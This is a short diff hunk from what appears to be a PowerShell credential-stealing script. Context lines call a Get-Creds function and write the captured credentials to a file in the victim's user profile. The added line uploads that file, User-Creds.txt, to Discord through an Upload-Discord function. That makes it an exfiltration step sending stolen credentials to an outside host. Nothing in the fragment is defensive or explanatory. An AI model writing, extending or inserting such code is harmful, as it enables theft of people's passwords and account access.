@@ -95,6 +95,7 @@ $creds = Get-Creds
 
 
 echo $creds >> $env:USERPROFILE\$FileName
+Upload-Discord -file "User-Creds.txt"
 
 
 #--------------------------------------------------------------------
